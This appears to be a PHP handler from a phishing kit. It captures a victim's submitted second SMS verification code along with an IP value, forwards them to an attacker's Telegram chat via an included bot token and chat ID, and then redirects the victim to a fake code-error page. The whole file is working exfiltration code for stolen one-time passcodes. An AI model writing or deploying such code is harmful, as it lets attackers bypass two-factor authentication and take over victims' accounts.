<?php
include "../telegram.php";
$sms2 = $_POST['sms2'];
$message .= 'Sms 2 : ' . $sms2 . "";
$message .= "IP:             : ".$ib."\n";
$tk = $token; $chid = $chatid; sendMessage($chid, $message, $tk);
header("location: ../codeerror.php?error=1&validation#_$dispatch");
?>